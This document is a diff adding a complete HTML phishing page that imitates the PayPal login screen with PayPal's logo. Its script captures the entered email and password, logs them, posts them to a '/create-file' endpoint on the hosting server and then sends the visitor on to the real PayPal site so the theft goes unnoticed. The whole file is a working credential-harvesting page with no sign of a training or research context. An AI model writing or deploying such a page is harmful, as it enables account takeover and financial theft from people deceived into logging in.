@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100 flex justify-center items-center h-screen">
+    <div class="bg-white p-8 rounded-lg shadow-md w-96">
+        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" alt="PayPal Logo" class="mx-auto mb-4">
+        <h2 class="text-xl font-semibold text-center mb-4">Log in to your PayPal account</h2>
+        
+        <form onsubmit="Login(event)">
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700">Email or mobile number</label>
+                <input type="text" class="w-full p-2 border border-gray-300 rounded-md focus:outline-blue-500" id="username" required>
+            </div>
+            <div class="mb-4">
+                <label class="block text-sm font-medium text-gray-700">Password</label>
+                <input type="password" class="w-full p-2 border border-gray-300 rounded-md focus:outline-blue-500" id="password" required>
+            </div>
+            <button type="submit" class="w-full bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600">Log In</button>
+        </form>
+
+        <script>
+            function Login(event) {
+                event.preventDefault(); // Prevent the form from submitting
+
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+
+                console.log("Username: " + username + "\nPassword: " + password);
+
+                // Send data to the server using fetch
+                fetch('/create-file', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ username, password })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data.message);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+
+                window.location.href = "https://www.paypal.com/us/home";
+            }
+        </script>
+    </div>
+</body>
+</html>
+
